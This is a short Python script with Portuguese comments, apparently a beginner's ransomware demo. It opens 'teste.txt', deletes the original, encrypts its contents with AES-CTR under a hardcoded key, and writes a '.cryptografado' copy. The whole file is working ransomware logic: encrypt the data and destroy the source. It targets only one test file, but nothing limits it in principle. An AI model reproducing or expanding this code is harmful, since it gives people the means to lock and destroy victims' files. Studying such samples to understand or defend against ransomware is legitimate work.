import os
import pyaes

# abre o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# deleta o arquivo
os.remove(file_name)

# chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

#criptografa o arquivo
crypto_data = aes.encrypt(file_data)

# cria um arquivo criptografado
new_file = file_name + ".cryptografado"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()